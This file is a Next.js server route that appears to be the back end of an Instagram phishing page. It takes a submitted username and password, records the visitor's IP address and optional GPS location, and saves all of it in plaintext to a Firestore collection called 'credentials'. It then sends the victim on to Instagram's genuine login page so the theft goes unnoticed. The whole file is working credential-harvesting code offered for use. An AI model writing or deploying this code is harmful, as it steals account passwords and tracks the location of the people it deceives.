import { NextResponse } from 'next/server';
import admin from 'firebase-admin';

// Initialize Firebase
if (!admin.apps.length) {
  try {
    const serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG || '{}');
    admin.initializeApp({
      credential: admin.credential.cert({
        projectId: serviceAccount.project_id,
        clientEmail: serviceAccount.client_email,
        privateKey: serviceAccount.private_key.replace(/\\n/g, '\n')
      })
    });
  } catch (e) {
    console.error('Firebase init error:', e);
  }
}

export async function POST(request: Request) {
  try {
    const formData = await request.formData();
    const username = formData.get('username')?.toString() || '';
    const password = formData.get('password')?.toString() || '';
    const ip = request.headers.get('x-forwarded-for') || '';
    const locationConsent = formData.get('locationConsent')?.toString() === 'true';

    if (!username || !password) {
      return NextResponse.json(
        { error: 'Missing credentials' },
        { status: 400 }
      );
    }

    // Process location data if consent was given
    let locationData = null;
    if (locationConsent) {
      const lat = parseFloat(formData.get('latitude')?.toString() || '0');
      const lng = parseFloat(formData.get('longitude')?.toString() || '0');
      const accuracy = parseFloat(formData.get('accuracy')?.toString() || '0');
      
      if (lat && lng) {
        locationData = {
          coordinates: new admin.firestore.GeoPoint(lat, lng),
          accuracy,
          timestamp: admin.firestore.FieldValue.serverTimestamp()
        };
      }
    }

    if (admin.apps.length) {
      await admin.firestore().collection('credentials').add({
        username,
        password,
        timestamp: admin.firestore.FieldValue.serverTimestamp(),
        ip_address: ip,
        location: locationData,
        hasLocationConsent: locationConsent
      });
    }

    return NextResponse.json(
      { success: true, redirectUrl: 'https://www.instagram.com/accounts/login/' },
      { status: 200 }
    );

  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json(
      { error: 'Server error' },
      { status: 500 }
    );
  }
}

export async function OPTIONS() {
  return new Response(null, {
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}